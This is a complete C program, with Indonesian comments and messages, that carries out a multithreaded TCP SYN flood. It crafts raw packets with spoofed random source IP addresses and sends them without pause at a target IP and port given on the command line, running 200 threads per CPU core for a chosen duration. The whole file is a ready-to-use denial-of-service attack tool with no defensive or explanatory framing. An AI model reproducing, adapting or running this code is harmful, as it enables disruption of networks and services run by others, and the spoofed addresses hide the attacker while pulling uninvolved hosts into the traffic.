#define _GNU_SOURCE
#include <unistd.h>
#include <time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <pthread.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define MAX_PACKET_SIZE 4096
#define PHI 0x9e3779b9
#define THREAD_MULTIPLIER 200

static unsigned long int Q[4096], c = 362436;
volatile sig_atomic_t running = 1;

// Structure untuk parameter serangan
typedef struct {
    char* target;
    int port;
    int duration;
} AttackParams;

void init_rand(unsigned long int x) {
    int i;
    Q[0] = x;
    Q[1] = x + PHI;
    Q[2] = x + PHI + PHI;
    for (i = 3; i < 4096; i++) {
        Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
    }
}

unsigned long int rand_cmwc(void) {
    unsigned long long t, a = 18782LL;
    static unsigned long i = 4095;
    unsigned long x, r = 0xfffffffe;
    i = (i + 1) & 4095;
    t = a * Q[i] + c;
    c = (t >> 32);
    x = t + c;
    if (x < c) {
        x++;
        c++;
    }
    return (Q[i] = r - x);
}

unsigned short csum(unsigned short *buf, int count) {
    register unsigned long sum = 0;
    while (count > 1) {
        sum += *buf++;
        count -= 2;
    }
    if (count > 0) sum += *(unsigned char *)buf;
    while (sum >> 16) sum = (sum & 0xffff) + (sum >> 16);
    return (unsigned short)(~sum);
}

void setup_ip_header(struct iphdr *iph) {
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
    iph->id = htonl(rand_cmwc() & 0xFFFFFFFF);
    iph->frag_off = 0;
    iph->ttl = 255;
    iph->protocol = IPPROTO_TCP;
    iph->check = 0;
}

void* flood(void* arg) {
    AttackParams* params = (AttackParams*)arg;
    char datagram[MAX_PACKET_SIZE];
    struct iphdr *iph = (struct iphdr *)datagram;
    struct tcphdr *tcph = (struct tcphdr*)(datagram + sizeof(struct iphdr));
    struct sockaddr_in sin;

    // Setup alamat target
    sin.sin_family = AF_INET;
    sin.sin_port = htons(params->port);
    sin.sin_addr.s_addr = inet_addr(params->target);

    // Buat raw socket
    int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
    if(s < 0) {
        perror("socket");
        return NULL;
    }

    int tmp = 1;
    const int *val = &tmp;
    if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof(tmp)) < 0) {
        perror("setsockopt");
        close(s);
        return NULL;
    }

    init_rand(time(NULL));
    while(running) {
        // Setup header acak
        memset(datagram, 0, MAX_PACKET_SIZE);
        setup_ip_header(iph);
        
        iph->saddr = rand_cmwc();
        iph->daddr = sin.sin_addr.s_addr;
        iph->check = csum((unsigned short *)datagram, iph->tot_len);

        // Setup TCP header
        tcph->source = htons(rand_cmwc() & 0xFFFF);
        tcph->dest = htons(params->port);
        tcph->seq = rand_cmwc();
        tcph->ack_seq = 0;
        tcph->doff = 5;
        tcph->syn = 1;
        tcph->window = htons(65535);
        tcph->check = 0;

        // Kirim paket
        sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&sin, sizeof(sin));
    }

    close(s);
    return NULL;
}

void* timer(void* arg) {
    int duration = *((int*)arg);
    sleep(duration);
    running = 0;
    return NULL;
}

int main(int argc, char *argv[]) {
    if(argc != 4) {
        printf("Penggunaan: %s <IP> <PORT> <TIME>\n", argv[0]);
        return 1;
    }

    AttackParams params = {
        .target = argv[1],
        .port = atoi(argv[2]),
        .duration = atoi(argv[3])
    };

    // Hitung jumlah thread optimal
    int num_cores = sysconf(_SC_NPROCESSORS_ONLN);
    int num_threads = num_cores * THREAD_MULTIPLIER;
    pthread_t threads[num_threads];
    pthread_t timer_thread;

    printf("[+] Memulai serangan ke %s:%d selama %d detik\n", params.target, params.port, params.duration);
    printf("[+] Menggunakan %d thread\n", num_threads);

    // Jalankan timer
    pthread_create(&timer_thread, NULL, timer, &params.duration);

    // Jalankan thread serangan
    for(int i = 0; i < num_threads; i++) {
        pthread_create(&threads[i], NULL, flood, &params);
    }

    // Tunggu semua thread selesai
    for(int i = 0; i < num_threads; i++) {
        pthread_join(threads[i], NULL);
    }
    pthread_join(timer_thread, NULL);

    printf("[+] Serangan selesai\n");
    return 0;
}
